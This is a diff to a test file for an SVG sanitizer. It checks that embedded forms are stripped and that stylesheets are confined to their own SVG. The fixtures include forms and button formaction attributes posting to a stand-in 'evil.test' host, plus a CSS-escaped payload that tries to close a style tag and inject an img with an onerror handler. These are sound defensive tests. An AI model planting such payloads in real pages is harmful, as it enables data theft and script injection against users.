@@ -98,6 +98,41 @@ describe("sanitizeSvg — external resource references must not phone home", () 
   });
 });
 
+// WI-RA8.1 — a form in a diagram posts to whatever the document named.
+describe("sanitizeSvg — a diagram cannot carry a form", () => {
+  const form =
+    '<svg><foreignObject><form action="https://evil.test/collect" method="post">' +
+    '<input name="q" value="1"><button>Go</button></form></foreignObject></svg>';
+
+  it("removes the form element and the address it would post to", () => {
+    const out = sanitizeSvg(form);
+    expect(out).not.toMatch(/<form/i);
+    expect(out).not.toContain("evil.test");
+  });
+
+  it("keeps what was inside it — the content is not the danger", () => {
+    const out = sanitizeSvg(form);
+    expect(out).toContain("<button>Go</button>");
+    expect(out).toContain('<input name="q"');
+  });
+
+  it.each(["FORM", "Form", "fOrM"])("removes it however the tag is cased (%s)", (tag) => {
+    const out = sanitizeSvg(
+      `<svg><foreignObject><${tag} action="https://evil.test/c">x</${tag}></foreignObject></svg>`,
+    );
+    expect(out).not.toMatch(/<form/i);
+    expect(out).toContain("x");
+  });
+
+  it("removes a button's own posting address and its link to a form elsewhere", () => {
+    const out = sanitizeSvg(
+      '<svg><foreignObject><button form="app-form" formaction="https://evil.test/b">Go</button></foreignObject></svg>',
+    );
+    expect(out).not.toContain("formaction");
+    expect(out).not.toContain("app-form");
+  });
+});
+
 describe("sanitizeSvg — stylesheet content", () => {
   it("strips a remote @import from a <style> element", () => {
     // The attribute hook never sees this: the payload is element TEXT.
@@ -116,7 +151,81 @@ describe("sanitizeSvg — stylesheet content", () => {
     const out = sanitizeSvg(
       "<svg><style>.node rect{fill:#eee;stroke:#333}</style><rect/></svg>",
     );
-    expect(out).toContain("fill:#eee");
+    // Re-serialized from the parsed sheet, so the spelling is the parser's.
+    expect(out).toMatch(/fill:\s*(#eee|rgb\(238, 238, 238\))/);
+  });
+});
+
+// WI-RA8.2 — the stylesheet and the SVG it styles are tied together by a scope
+// attribute only the sanitizer writes.
+describe("sanitizeSvg — stylesheet scope", () => {
+  const ATTR = "data-vmark-svg-scope";
+
+  function parse(out: string) {
+    const doc = new DOMParser().parseFromString(out, "text/html");
+    const root = doc.querySelector("svg")!;
+    const key = root.getAttribute(ATTR);
+    return { doc, root, key, styleText: doc.querySelector("style")?.textContent ?? "" };
+  }
+
+  it("marks the root and confines every rule to it", () => {
+    const { key, styleText } = parse(sanitizeSvg("<svg><style>body *{visibility:hidden}</style><rect/></svg>"));
+    expect(key).toMatch(/^[a-z0-9]+$/);
+    expect(styleText).toContain(`:is([${ATTR}="${key}"], [${ATTR}="${key}"] *):is(body *)`);
+  });
+
+  it("gives every sanitize call its own scope", () => {
+    const input = "<svg><style>rect{fill:red}</style><rect/></svg>";
+    expect(parse(sanitizeSvg(input)).key).not.toBe(parse(sanitizeSvg(input)).key);
+  });
+
+  it("marks only the outermost svg", () => {
+    const { doc, root } = parse(
+      sanitizeSvg("<svg><style>rect{fill:red}</style><g><svg><rect/></svg></g></svg>"),
+    );
+    expect(root.hasAttribute(ATTR)).toBe(true);
+    expect(doc.querySelectorAll(`[${ATTR}]`)).toHaveLength(1);
+  });
+
+  it("ignores a scope attribute the document wrote itself", () => {
+    const out = sanitizeSvg(`<svg><rect ${ATTR}="spoof"/><g ${ATTR}="1"></g></svg>`);
+    expect(out).not.toContain(ATTR);
+  });
+
+  it("leaves an SVG with no stylesheet exactly as it was", () => {
+    expect(sanitizeSvg('<svg viewBox="0 0 1 1"><rect fill="red"/></svg>')).toBe(
+      '<svg viewBox="0 0 1 1"><rect fill="red"></rect></svg>',
+    );
+  });
+
+  it("removes a stylesheet that has nothing left once confined", () => {
+    expect(sanitizeSvg("<svg><style>@font-face{font-family:x}</style><rect/></svg>")).not.toMatch(/<style/i);
+  });
+
+  // Every `<` and `>` below is a CSS escape, so the HTML parser sees no tag;
+  // only resolving the escapes would write `</style><img …>` into the sheet.
+  // An HTML <style> (inside foreignObject) is raw text when serialized, so
+  // that text would close it.
+  it.each([
+    ["an SVG <style>", (css: string) => `<svg><style>${css}</style></svg>`],
+    [
+      "an HTML <style> inside foreignObject",
+      (css: string) => `<svg><foreignObject><style>${css}</style></foreignObject></svg>`,
+    ],
+  ])("cannot make %s close itself", (_label, wrap) => {
+    const out = sanitizeSvg(
+      wrap('[title="\\3c /style\\3e \\3c img src=x onerror=alert(1)\\3e "]{fill:red}'),
+    );
+    const reparsed = new DOMParser().parseFromString(out, "text/html");
+    expect(reparsed.querySelector("img")).toBeNull();
+    expect(out).not.toContain("onerror");
+  });
+
+  it("scopes a stylesheet inside foreignObject HTML too", () => {
+    const { key, styleText } = parse(
+      sanitizeSvg("<svg><foreignObject><style>body{display:none}</style><div>x</div></foreignObject></svg>"),
+    );
+    expect(styleText).toContain(`:is([${ATTR}="${key}"], [${ATTR}="${key}"] *):is(body)`);
   });
 });
 
